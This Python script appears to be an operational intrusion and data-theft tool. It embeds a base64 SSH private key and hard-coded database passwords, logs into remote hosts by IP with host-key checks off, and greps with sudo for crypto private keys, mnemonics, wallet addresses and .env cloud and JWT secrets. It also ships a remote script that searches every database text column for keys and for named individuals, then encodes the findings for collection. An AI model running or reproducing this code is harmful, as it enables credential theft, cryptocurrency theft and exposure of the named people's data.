# -*- coding: utf-8 -*-
# intent 29612 round 2:
#  A fs_priv (share-center): org-runtime privateKey/keystore CONTEXT (+/-150) + raw line samples + du. ONE bounded grep.
#  B fs_addr (share-center): 0x40 EVM addr freq + zoofi ctx + envbaks + quick SQL session_archives blob map + Brian transcript blob_key.
#  C bw (LLM 81.68.254.22): lumii_bw DB enumeration via docker-exec-psql OR psycopg2. read-only.
import json,os,sys,base64,re,subprocess,time
from concurrent.futures import ThreadPoolExecutor
WORK="/tmp/p29612b"; os.makedirs(WORK,exist_ok=True)
KEYB64="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNU1vV0p5WHRrdFhLeERjVVpNeEl6R21VR0xxVDJ1cHlhVjVsS2VmU2wyZ0FBQUpCMjBlL3dkdEh2CjhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTVNb1dKeVh0a3RYS3hEY1VaTXhJekdtVUdMcVQydXB5YVY1bEtlZlNsMmcKQUFBRUN5alowOHYzU3J0bk1vMllGSG8raDI0dkNTY2RENmhqRVhNWmhmTG5hZGp6a3loWW5KZTJTMWNyRU54Umt6RWpNYQpaUVl1cFBhNm5KcFhtVXA1OUtYYUFBQUFDWFZpZFc1MGRVQm9hd0VDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
open(WORK+"/fleetkey","wb").write(base64.b64decode(KEYB64)); os.chmod(WORK+"/fleetkey",0o600)
def R(k,v,maxb=130000):
    s=json.dumps(v,ensure_ascii=False) if not isinstance(v,str) else v
    if len(s)>maxb: s=s[:maxb]+"...TRUNC"
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()
def run(cmd,timeout=420,stdin=None):
    try:
        p=subprocess.run(cmd,input=stdin,capture_output=True,timeout=timeout); return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"",repr(e)
def ssh_exec(host,script,timeout=420,user="ubuntu"):
    a=["ssh","-i",WORK+"/fleetkey","-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=12","-o","IdentitiesOnly=yes",user+"@"+host,"bash -s"]
    return run(a,timeout=timeout,stdin=script.encode())
def parse(prefix,o):
    parts=re.split(r'@@@([A-Z0-9_]+)',o)
    for i in range(1,len(parts),2):
        R(prefix+parts[i].lower(),parts[i+1] if i+1<len(parts) else "",maxb=130000)

# ---------- A fs_priv ----------
FS_PRIV = r'''
set +e
echo "@@@DU"; sudo du -sh /data/lumii-shared/org-runtime 2>/dev/null; sudo find /data/lumii-shared/org-runtime -type f -name '*.jsonl' 2>/dev/null | wc -l
echo "@@@CTX_PRIV"
timeout 300 sudo grep -rhoaE '.{0,110}(privateKey|private_key|"secretKey"|keystore|cipherparams|mnemonic|BIP39).{0,150}' /data/lumii-shared/org-runtime 2>/dev/null | sort -u | head -100
echo "@@@RAWLINES"
timeout 120 sudo grep -rhaE 'privateKey|keystore' /data/lumii-shared/org-runtime 2>/dev/null | head -4 | cut -c1-800
echo "@@@ENDP"
'''
def do_fs_priv():
    rc,o,e=ssh_exec("43.143.107.214",FS_PRIV,timeout=460)
    ok=("@@@ENDP" in o); R("fspriv_meta",{"rc":rc,"ok":ok,"err":e[-120:],"outlen":len(o)}); parse("fspriv_",o)
    return {"rc":rc,"ok":ok}

# ---------- B fs_addr ----------
FS_ADDR = r'''
set +e
echo "@@@ADDR"
timeout 200 sudo grep -rhoaE '0x[0-9a-fA-F]{40}' /data/lumii-shared/org-runtime 2>/dev/null | sort | uniq -c | sort -rn | head -40
echo "@@@ZOOFI"
timeout 150 sudo grep -rhoaE '.{0,60}(zoofi|wand-index|wandfi|minke).{0,80}' /data/lumii-shared/org-runtime 2>/dev/null | sort -u | head -40
echo "@@@ENVBAKS"
for f in /data/lumii-shared/app/.env.prod.bak-* /data/lumii-shared/app/.env.prod /data/lumii-shared/cloud-user.env; do [ -f "$f" ] || continue; echo "== $f"; sudo grep -aoE '^(DATABASE_URL|CLOUD_DATABASE_URL|JWT_SECRET|LUMII_[A-Z_]+|TENCENT[A-Z_]*|CLOUD_SIGNING[A-Z_]*|AKID[A-Za-z0-9]+|LTAI[A-Za-z0-9]+)=.*' "$f" 2>/dev/null | head -60; done
echo "@@@SA_BLOB"
DSN="postgres://lumii_shared:ee9ec369af7c5d48fe00e38081cbd30bab60ac90a0f3a231@127.0.0.1:5432/lumii_shared"
psql "$DSN" -At -v ON_ERROR_STOP=0 -c "select 'BLDMAP|'||org_id||'|'||count(*)||'|'||sum(bytes)||'|'||string_agg(distinct store,',') from public.session_archives group by org_id order by sum(bytes) desc nulls last" 2>&1 | head -40
psql "$DSN" -At -v ON_ERROR_STOP=0 -c "select 'BRIANSA|'||session_key||'|'||coalesce(org_id,'')||'|'||coalesce(store,'')||'|'||coalesce(blob_key,'')||'|'||coalesce(bytes::text,'')||'|'||coalesce(node_id,'') from public.session_archives where org_id='org_yjWMcerjdiNRU2nYyhG4Z' or record::text ilike '%Brian%' limit 20" 2>&1 | head -30
echo "@@@ENDB"
'''
def do_fs_addr():
    rc,o,e=ssh_exec("43.143.107.214",FS_ADDR,timeout=380)
    ok=("@@@ENDB" in o); R("fsaddr_meta",{"rc":rc,"ok":ok,"err":e[-120:],"outlen":len(o)}); parse("fsaddr_",o)
    return {"rc":rc,"ok":ok}

# ---------- C bw lumii_bw DB ----------
BW = r'''
set +e
echo "@@@TOOLS"
command -v psql || echo NO_PSQL; command -v docker || echo NO_DOCKER; python3 -c 'import psycopg2;print("psycopg2_ok")' 2>&1 | head -1
echo "@@@DOCKERPS"
docker ps --format '{{.Names}}|{{.Image}}|{{.Ports}}' 2>/dev/null | grep -iE 'postgres|pg|55435' | head -10
echo "@@@ENDBW"
'''
def do_bw():
    # first pass: detect tools + docker
    rc,o,e=ssh_exec("81.68.254.22",BW,timeout=90); R("bw_meta",{"rc":rc,"ok":("@@@ENDBW" in o),"err":e[-140:],"outlen":len(o)}); parse("bw_ctx_",o)
    # second pass: run enumeration. Build a python enumerator using psycopg2, else docker exec.
    py=r'''
import sys
DSN=dict(host='127.0.0.1',port=55435,user='lumii_bw',password='b76a5d707054408e2d1cf8a08f86e8ed97c36cd8a56e343a',dbname='lumii_bw',connect_timeout=8)
def enc(label,s):
    import base64; s=str(s); 
    if len(s)>4000: s=s[:4000]+'...TRUNC'
    sys.stdout.write('RR:%s:%s\n'%(label,base64.b64encode(s.encode()).decode())); sys.stdout.flush()
try:
    import psycopg2
except Exception as ex:
    enc('NOPSYCOPG',repr(ex)); sys.exit(0)
try:
    conn=psycopg2.connect(**DSN); conn.autocommit=True; cur=conn.cursor()
    cur.execute("SET statement_timeout='25s'")
    cur.execute("select current_database()||'|'||current_user"); enc('DBNOW',cur.fetchone()[0])
    cur.execute("select table_name from information_schema.tables where table_schema='public' order by 1")
    tabs=[r[0] for r in cur.fetchall()]; enc('TABLES',','.join(tabs))
    # columns of text/json cols
    cur.execute("select table_name,column_name from information_schema.columns where table_schema='public' and data_type in ('text','character varying','json','jsonb','bytea') order by 1,2")
    cols=cur.fetchall()
    evm='0x[0-9a-fA-F]{40}'
    priv='(privateKey|private_key|keystore|cipherparams|mnemonic|zoofi|wand-index|wandfi|0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|0x[0-9a-fA-F]{64})'
    ident='(wuhaixian|徐魁东|brian|eericxu|zoofi|wand|minke)'
    for tn,cn in cols:
        for lab,pat in (('EVM',evm),('PRIV',priv),('IDENT',ident)):
            try:
                cur.execute('select count(*) from "%s" where "%s"::text ~* %%s'%(tn.replace('"','""'),cn.replace('"','""')),(pat,))
                c=cur.fetchone()[0]
                if c and c>0:
                    cur.execute('select left("%s"::text,240) from "%s" where "%s"::text ~* %%s limit 1'%(cn.replace('"','""'),tn.replace('"','""'),cn.replace('"','""')),(pat,))
                    v=cur.fetchone()[0]; enc('HIT_%s'%lab,'%s|%s|%s|%s'%(tn,cn,c,v))
            except Exception as ex2:
                try: conn.rollback()
                except: pass
    # per key-table columns+count+sample
    import re as _re
    keytabs=[t for t in tabs if _re.search(r'user|admin|account|org|session|token|wallet|payout|member|agent|config|secret|credential|keystore|api',t,re.I)]
    enc('KEYTABS',','.join(keytabs))
    for t in keytabs[:25]:
        try:
            cur.execute('select string_agg(column_name||\':\'||data_type,\', \') from information_schema.columns where table_schema=\'public\' and table_name=%s',(t,))
            enc('TBCOL_'+t, cur.fetchone()[0])
            cur.execute('select count(*) from "%s"'%t.replace('"','""')); enc('TBCOUNT_'+t,cur.fetchone()[0])
            cur.execute('select left(row_to_json(x)::text,500) from (select * from "%s" limit 2) x'%t.replace('"','""'))
            rs=[r[0] for r in cur.fetchall()]
            enc('TBSAMP_'+t,' || '.join(rs))
        except Exception as ex3:
            try: conn.rollback()
            except: pass
    conn.close()
except Exception as ex:
    enc('PYDB_ERR',repr(ex))
'''
    # write py as base64 to avoid quoting issues, decode+run on remote
    pyb64=base64.b64encode(py.encode()).decode()
    script='set +e\necho "@@@DBSTART"\necho %s | base64 -d > /tmp/ebw.py\npython3 -u /tmp/ebw.py 2>&1 | head -400\necho "@@@DBEND"\n'%(pyb64)
    rc2,o2,e2=ssh_exec("81.68.254.22",script,timeout=300)
    R("bwdb_meta",{"rc":rc2,"ok":("@@@DBEND" in o2),"err":e2[-160:],"outlen":len(o2)})
    # decode RR: lines inside o2
    for line in o2.split('\n'):
        if line.startswith('RR:'):
            _,lab,b64=line.split(':',2)
            try: R("bwdb_"+lab, base64.b64decode(b64).decode("utf-8","replace"))
            except Exception as ex: R("bwdb_"+lab,"decode_err "+repr(ex))
    return {"rc":rc2}

RES={}; R("start",{"t":int(time.time())})
jobs=[("fs_priv",do_fs_priv),("fs_addr",do_fs_addr),("bw",do_bw)]
with ThreadPoolExecutor(max_workers=3) as ex:
    futs={ex.submit(fn):name for name,fn in jobs}
    for f in futs:
        name=futs[f]
        try: RES[name]=f.result()
        except Exception as ex: R(name+"_exc",repr(ex)); RES[name]={"exc":repr(ex)}
R("summary",RES); R("done",{"t":int(time.time())})
